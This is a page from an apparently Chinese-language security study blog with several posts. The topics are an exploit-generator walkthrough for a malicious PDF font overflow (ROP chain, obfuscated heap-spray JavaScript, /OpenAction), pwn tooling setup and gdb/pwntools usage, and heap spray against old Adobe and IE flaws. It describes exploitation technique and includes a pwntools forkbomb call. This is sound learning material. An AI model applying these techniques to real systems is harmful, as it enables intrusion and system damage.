<h4 id="make-ttf"><a href="#make-ttf" class="headerlink" title="make_ttf()"></a>make_ttf()</h4><p>  此函数首先打开了一个<code>正常的ttf模板</code>文件,然后构造了<code>SING表</code>数据,将<code>ttf字体</code>文件中的<code>name表</code>数据替换为<code>构造的SING表</code>数据,<code>“name”</code>字符串替换为<code>“SING”</code>。<code>构造的SING表数据</code>包括用于将程序控制流劫持到<code>Heap Spary代码</code>处执行的<code>ROP Chain</code>,以及溢出后、获得程序控制流之前,用于绕过<code>造成程序执行出错</code>的数据。</p>
<h4 id="make-js"><a href="#make-js" class="headerlink" title="make_js()"></a>make_js()</h4><p>  此函数的功能将j<code>avascript的代码</code>转换为<code>字符串</code>,并将javascript的<code>变量名</code>进行<code>混淆</code>。javascript的代码用于<code>堆喷</code>,所以我们应将用于将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>以及<code>经过编码的Payload</code>编入其中。将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>的细节前面讲过了,就不说了。</p>
<h4 id="make-pdf"><a href="#make-pdf" class="headerlink" title="make_pdf()"></a>make_pdf()</h4><p>  此函数一步一步构造<code>pdf</code>中的每一个<code>obj</code>,将<code>ttf字体数据</code>和<code>javascript代码</code>分别放在了<code>obj10</code>和<code>obj12</code>,然后在<code>obj1</code>中设置<code>/OpenAction 11 0 R</code>,使pdf文件<code>打开</code>时,<code>javascript</code>能够被执行,从而实现<code>Heap Spary</code>。还构造了<code>obj13</code>,使<code>icucnv36.dll</code>能够被加载。因为,<code>exp</code>中使用的<code>ROPgadget</code>都是出自<code>icucnv36.dll</code>模块的,所以其必须要<code>被加载到内存</code>中。</p>
<h3 id="TEB-PEB"><a href="#TEB-PEB" class="headerlink" title="TEB\PEB"></a>TEB\PEB</h3><p>一个可执行文件被OS加载到内存，并处理完成相关的模块加载，导入表处理……及其他必须处理后，形成一个进程。在OS内核中保存有一份关于这个进程的身份证信息，就是平常看到的HANDLE，叫进程句柄。</p>
<p>TEB偏移0x30处是本进程的PEB结构体指针，通过这个指针即可取得PEB的地址，从而继续读取更多的关于本进程的一些信息。</p>
<p>PEB(Process Environment Block，进程环境块)：存放进程信息，准确的PEB地址应该从系统的EXPROCESS结构的0x1b0偏移出获得，但这个结构位于系统地址空间，访问 需要 ring0权限，所以一般通过TEB结构的偏移0x30处获取PEB.</p>
<pre><code>获取peb代码：mov eax, fs:[0x30]  

     mov PEB, eax
</code></pre>
<p>TEB(Thread Environment Block，线程环境块)： 存放线程信息，位于用户地址空间，进程中的每个线程都有自己的一个TEB.通过fs寄存器来访问，一般储存在fs:[0].</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/12/pwn-environment-layout/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/12/pwn-environment-layout/" class="post-title-link" itemprop="url">pwn-environment-layout</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-04-12 17:20:31" itemprop="dateCreated datePublished" datetime="2021-04-12T17:20:31+08:00">2021-04-12</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-04-25 10:07:40" itemprop="dateModified" datetime="2021-04-25T10:07:40+08:00">2021-04-25</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="pwn环境布置"><a href="#pwn环境布置" class="headerlink" title="pwn环境布置"></a>pwn环境布置</h1><h2 id="ubuntu18-04安装："><a href="#ubuntu18-04安装：" class="headerlink" title="ubuntu18.04安装："></a>ubuntu18.04安装：</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/38797088">VMware安装Ubuntu18.04（必会） - 知乎 (zhihu.com)</a></p>
<h2 id="给ubuntu18-04换源"><a href="#给ubuntu18-04换源" class="headerlink" title="给ubuntu18.04换源"></a>给ubuntu18.04换源</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiangxianghehe/article/details/80112149">Ubuntu 18.04换国内源 中科大源 阿里源 163源 清华源_xiangxianghehe的博客-CSDN博客</a></p>
<p>(注意没有权限记得sudo)</p>
<h2 id="安装编译Python源程序所需的包"><a href="#安装编译Python源程序所需的包" class="headerlink" title="安装编译Python源程序所需的包"></a>安装编译Python源程序所需的包</h2><p>sudo apt install build-essential -y<br>sudo apt install libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev -y<br>sudo apt-get install zlib1g-dev</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42261208/article/details/105227474">ubuntu18.04 pwn环境搭建_winterze的博客-CSDN博客</a></p>
<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p>sudo apt install git</p>
<h3 id="进行git配置"><a href="#进行git配置" class="headerlink" title="进行git配置"></a>进行git配置</h3><p>sudo git config –global user.name ‘自定义用户名’<br>sudo git config –global user.email ‘邮箱’</p>
<h2 id="Pwn常用软件（python2）"><a href="#Pwn常用软件（python2）" class="headerlink" title="Pwn常用软件（python2）"></a>Pwn常用软件（python2）</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>sudo apt-get install python python-pip python-dev libssl-dev libffi-dev build-essential</p>
<p>sudo pip install -U setuptools</p>
<p>sudo pip install –upgrade pip</p>
<p>sudo pip install –upgrade pwntools</p>
<p>测试：</p>
<p>import pwn<br>pwn.asm(“xor eax,eax”)<br>b’1\xc0’</p>
<p>（配置过程中遇到问题 python-tox 不匹配，用了以下命令解决<br>sudo pip install six –user -U<br>sudo pip install ipython –user -U）</p>
<h3 id="安装gdb"><a href="#安装gdb" class="headerlink" title="安装gdb"></a>安装gdb</h3><p>sudo apt-get install gdb</p>
<h3 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a></p>
<p> cd pwndbg </p>
<p>sudo ./setup.sh</p>
<h3 id="安装peda："><a href="#安装peda：" class="headerlink" title="安装peda："></a>安装peda：</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~/peda</p>
<p>echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit</p>
<h3 id="32位程序支持"><a href="#32位程序支持" class="headerlink" title="32位程序支持"></a>32位程序支持</h3><p>sudo apt-get install libc6-dev-i386</p>
<h3 id="32位依赖库"><a href="#32位依赖库" class="headerlink" title="32位依赖库"></a>32位依赖库</h3><p>sudo apt-get install lib32ncurses5</p>
<p>sudo apt-get install lib32z1</p>
<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a> </p>
<p>cd LibcSearcher </p>
<p>sudo python setup.py develop</p>
<h3 id="ROPgadget和one-gadget"><a href="#ROPgadget和one-gadget" class="headerlink" title="ROPgadget和one_gadget"></a>ROPgadget和one_gadget</h3><h4 id="安装ROPgadget："><a href="#安装ROPgadget：" class="headerlink" title="安装ROPgadget："></a>安装ROPgadget：</h4><p>sudo apt-get install python-capstone</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget.git">https://github.com/JonathanSalwan/ROPgadget.git</a></p>
<p>cd ROPgadget</p>
<p>sudo python setup.py install</p>
<h4 id="安装one-gadget："><a href="#安装one-gadget：" class="headerlink" title="安装one_gadget："></a>安装one_gadget：</h4><p>sudo apt install ruby</p>
<p>sudo gem install one_gadget</p>
<h2 id="pwndbg介绍及常见应用"><a href="#pwndbg介绍及常见应用" class="headerlink" title="pwndbg介绍及常见应用"></a>pwndbg介绍及常见应用</h2><p>他是linux下的一款程序调试器</p>
<h4 id="启动gdb"><a href="#启动gdb" class="headerlink" title="启动gdb"></a>启动gdb</h4><blockquote>
<p>$ gdb 可执行程序</p>
</blockquote>
<h4 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h4><p>将目标程序转为汇编代码</p>
<blockquote>
<p>$ disass 函数名字或者地址</p>
<p>如果要反汇编一个地址到另外一个地址之间的内容</p>
<p>$ disass 地址1，地址2</p>
</blockquote>
<h4 id="下断点和删除断点"><a href="#下断点和删除断点" class="headerlink" title="下断点和删除断点"></a>下断点和删除断点</h4><p>b *地址 or b 函数名字</p>
<p>删除断点：delete 1就是删除第一个断点</p>
<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>r </p>
<h4 id="继续执行"><a href="#继续执行" class="headerlink" title="继续执行"></a>继续执行</h4><p>s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；<br>n: 执行一行源程序代码，此行代码中的函数调用也一并执行。<br>s 相当于其它调试器中的“Step Into (单步跟踪进入)”；<br>n 相当于其它调试器中的“Step Over (单步跟踪)”。</p>
<h4 id="查看栈空间"><a href="#查看栈空间" class="headerlink" title="查看栈空间"></a>查看栈空间</h4><p>x/20xw 地址   显示20个单元，16进制，4字节每单元</p>
<blockquote>
<p>h=2 bytes,w=4 bytes,g=8 bytes.</p>
</blockquote>
<h4 id="查看堆空间"><a href="#查看堆空间" class="headerlink" title="查看堆空间"></a>查看堆空间</h4><p>x/32gx  堆地址</p>
<blockquote>
<p><strong>h=2 bytes,w=4 bytes,g=8 bytes.</strong></p>
</blockquote>
<p>格式：x/&lt;n/f/u&gt; <addr></p>
<p>整合这个命令的诠释：就是以addr为起始地址，返回n个单元的值，每个单元对应u个字节，输出格式是f。</p>
<p>n:是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义。</p>
<p>f:表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</p>
<p>x 按十六进制格式显示变量。</p>
<p>d 按十进制格式显示变量。</p>
<p>u 按十六进制格式显示无符号整型。</p>
<p>o 按八进制格式显示变量。</p>
<p>t 按二进制格式显示变量。</p>
<p>a 按十六进制格式显示变量。</p>
<p>c 按字符格式显示变量。</p>
<p>f 按浮点数格式显示变量。</p>
<p>u:就是指以多少个字节作为一个内存单元-unit,默认为4。当然u还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes.<br><addr>:表示内存地址。</p>
<p><img src="https://i.imgur.com/lVsP3IX.png"></p>
<h4 id="查看程序内存结构"><a href="#查看程序内存结构" class="headerlink" title="查看程序内存结构"></a>查看程序内存结构</h4><p>vmmap</p>
<p><img src="https://i.imgur.com/SlGTNMF.png"></p>
<h3 id="pwntools-1"><a href="#pwntools-1" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="Pwntools主要模块及其使用"><a href="#Pwntools主要模块及其使用" class="headerlink" title="Pwntools主要模块及其使用"></a>Pwntools主要模块及其使用</h4><p>from pwn import *<br>io = remote(“127.0.0.1”, 32152)<br>#与互联网主机交互<br>io.sendline(“hello”)<br>io.send(“hello”)<br>#sendline发送数据会在最后多添加一个回车<br>io.recv(1024)<br>io.revuntil()<br>io.recvline()<br>#recv()读取1024个字节，recvline()会读取一直到回车，recvuntil()读取到指定数据<br>io.interactive()</p>
<p>io = process(“./bin”, shell=True)<br>#启动本地程序进行交互，用于gdb调试</p>
<p>io.interactive()<br>io.p32(0xdeadbeef)<br>io.p64(0xdeadbeefdeadbeef)</p>
<blockquote>
<p>p64 和 p32 则分别转换 8 bit 和 4 bit 数字</p>
</blockquote>
<p>io.u32(“1234”)<br>io.u64(“12345678”)</p>
<p>将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</p>
<p>shellcraft&amp;asm<br>pwntools的shellcraft主要用来生成汇编代码形式的shellcode,而asm的作用是根据汇编代码编译出二进制shellcode。</p>
<p>#生成执行sh的shellcode并编译<br>asm(pwnlib.shellcraft.thumb.linux.sh(), arch=”thumb”)<br>#可以将thumb换成对应cpu</p>
<p>#读取flag并输出到标准输出<br>pwnlib.shellcraft.i386.linux.cat(“flag”, fd=1)</p>
<p>#使用forkbomb破坏系统（慎用）<br>pwnlib.shellcraft.i386.linux.forkbomb()</p>
<p>context<br>context.log_level = “debug”<br>context.arch = “amd64”</p>
<blockquote>
<p>设置成debug，pwntools会将所有io数据等输出，方便编写poc的时候进行调试，而arch可以设置攻击目标的指令构架。</p>
</blockquote>
<p>ELF<br>用于读取elf文件中的各种结构数据。例如plt，got，函数地址等等。</p>
<p><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/">pwntools — pwntools 4.3.1 documentation</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/03/25/Heap-Spray/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/03/25/Heap-Spray/" class="post-title-link" itemprop="url">Heap Spray</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-03-25 19:12:23" itemprop="dateCreated datePublished" datetime="2021-03-25T19:12:23+08:00">2021-03-25</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-04-24 23:40:54" itemprop="dateModified" datetime="2021-04-24T23:40:54+08:00">2021-04-24</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Windows内存保护机制"><a href="#Windows内存保护机制" class="headerlink" title="Windows内存保护机制"></a>Windows内存保护机制</h2><ul>
<li>GS编译</li>
<li>SafeSEH机制</li>
<li>SEH覆盖保护</li>
<li>数据执行保护（DEP）</li>
<li>地址随机化（ASLR）</li>
</ul>
<h3 id="GS编译–canary"><a href="#GS编译–canary" class="headerlink" title="GS编译–canary"></a>GS编译–canary</h3><p>​             —linux【canary】</p>
<p>​    GS编译保护技术是通过编译时添加相关代码而实现的，开启GS 编译选项后会在函数的开头和结尾添加代码来阻止栈溢出漏洞的利用。当应用程序启动时，程序的cookie被计算出来（伪随机数）并保存在.data 节段中，在函数的开头这个 cookie 被拷贝到栈中，位于返回地址和局部变量的中间。函数调用完后系统检测cookie值是否被修改。</p>
<blockquote>
<p>使用IDA反汇编会看到这个随机数被标记为：Security Cookie</p>
</blockquote>
<p>系统还将在.data的内存区域存放一个Security Cookie的副本</p>
<p><img src="https://i.imgur.com/b6xEJAG.png"></p>
<p><img src="https://i.imgur.com/SsoJBNy.png"></p>
<h3 id="堆在gdb中查看内存"><a href="#堆在gdb中查看内存" class="headerlink" title="堆在gdb中查看内存"></a>堆在gdb中查看内存</h3><p><img src="https://i.imgur.com/cKrR3u7.png"></p>
<p>？：21和20d51是什么意思</p>
<p>21是AMP中的MP，M若不是1则就是heap分配的，p为1表示前一个chunk正在使用。</p>
<p><img src="https://i.imgur.com/D3SdtC6.png"></p>
<p>在 gdb 调试中，使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;32gx &amp;main_arena</span><br></pre></td></tr></table></figure>
<p>可以看到 main_arena 的内存分配情况。</p>
<p><img src="https://i.imgur.com/EpjrAaB.png"></p>
<h3 id="HEAP-SPRAY"><a href="#HEAP-SPRAY" class="headerlink" title="HEAP SPRAY"></a>HEAP SPRAY</h3><p>无论是栈溢出还是堆溢出，最终都会获得EIP。我们很难的浏览器中复杂的内存环境下布置完整的shellcode。页面中的javascript可以申请堆内存，因此，shellcode</p>
<p>通过javascript布置在堆中成为可能。</p>
<p>在使用堆喷的时候，一般会将eip指向堆区的0x0c0c0c0c的位置。</p>
<blockquote>
<p>修改虚函数表，将其指向0x0c0c0c0c,为什么选择这个地址呢，因为执行这个地址也不会对我们shellcode有什么影响。</p>
<p>0x0C0C0C0C将被含有shellcode的内存片覆盖，只要内存片中的0x90能够命中0x0c0c0c0c的位置，shellcode就能最终执行。 </p>
</blockquote>
<p><img src="https://i.imgur.com/sb4QjrL.png"></p>
<p>任意nop命中0x0c0c0c0c攻击就能成功。</p>
<h4 id="实践堆喷MS06-055分析"><a href="#实践堆喷MS06-055分析" class="headerlink" title="实践堆喷MS06-055分析"></a>实践堆喷MS06-055分析</h4><p>存在栈溢出，控制了eip。返回地址被填上0x0c0c0c0c。</p>
<p>我们将nop和shellcode组合成的内存片填充直到200mb。</p>
<p>当跳转到0x0c0c0c0c的时候就会执行nop最后执行我们的shellcode的。</p>
<p>javascript以unicode形式识别字符串。</p>
<blockquote>
<p>“\x44\x77” 转化成“\u7744”以\u为转义符，将双字节逆序。</p>
</blockquote>
<h3 id="PDF中的JS–cve-2009-0927"><a href="#PDF中的JS–cve-2009-0927" class="headerlink" title="PDF中的JS–cve-2009-0927"></a>PDF中的JS–cve-2009-0927</h3><h4 id="pdf文档格式"><a href="#pdf文档格式" class="headerlink" title="pdf文档格式"></a>pdf文档格式</h4><p>是一种文本和二进制混排的格式。由四部分构成：</p>
<p><img src="https://i.imgur.com/WyBBxbg.png"></p>
<p><img src="https://i.imgur.com/cEin8Em.png"></p>
<p><img src="https://i.imgur.com/ECyv9JD.png"></p>
<p><img src="https://i.imgur.com/BDtFkFN.png"></p>
<p><img src="https://i.imgur.com/oTVR8vp.png"></p>
<p>一个pdf文件被打开时就会执行openaction对象里面的脚本，只要在openaction对象里添加精心构造的JS脚本就可以实现对ADOBE READER的攻击。</p>
<p>xref:f表示被删除或者没有用。</p>
<p>pdf格式详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/bobob/article/details/751381?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-6&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/bobob/article/details/751381?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-6&amp;spm=1001.2101.3001.4242</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>


<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">eetan</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
